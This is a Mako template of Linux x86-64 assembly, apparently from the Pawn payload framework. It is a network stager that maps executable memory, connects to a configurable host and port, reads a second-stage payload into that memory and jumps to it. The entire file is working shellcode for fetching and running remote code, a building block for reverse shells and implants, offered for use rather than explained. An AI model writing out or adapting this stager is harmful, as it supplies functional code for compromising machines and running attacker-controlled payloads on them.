<%doc>
This template requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
</%doc>

<%doc>
Copyright (c) Ivan Nikolskiy 2023

Connect to TCP server and read second phase
</%doc>

<%page args="host, port, length, reliable, sock" />
start:
    push    0x9
    pop     rax
    xor     rdi, rdi
    push    ${hex(length)}
    pop     rsi
    push    0x7
    pop     rdx
    xor     r9, r9
    push    0x22
    pop     r10
    syscall

%if reliable:
    test    rax, rax
    js      fail
%endif

    push    rax

    push    0x29
    pop     rax
    cdq
    push    0x2
    pop     rdi
    push    0x10
    pop     rsi
    syscall

    xchg    rdi, rax
    movabs  rcx, 0x${pack_ipv4(host).hex()}${pack_port(port).hex()}0002
    push    rcx
    mov     rsi, rsp
    push    0x10
    pop     rdx
    push    0x2a
    pop     rax
    syscall

    pop     rcx
    push    0x2d
    pop     rax
    pop     rsi
    push    ${hex(length)}
    pop     rdx
    push    0x100
    pop     r10
    syscall

%if reliable:
    test    rax, rax
    js      fail
%endif

%if sock != 'rdi':
    push    rdi
    pop     ${sock}
%endif

    jmp rsi

%if reliable:
fail:
    push    0x3c
    pop     rax
    xor     rdi, rdi
    syscall
%endif
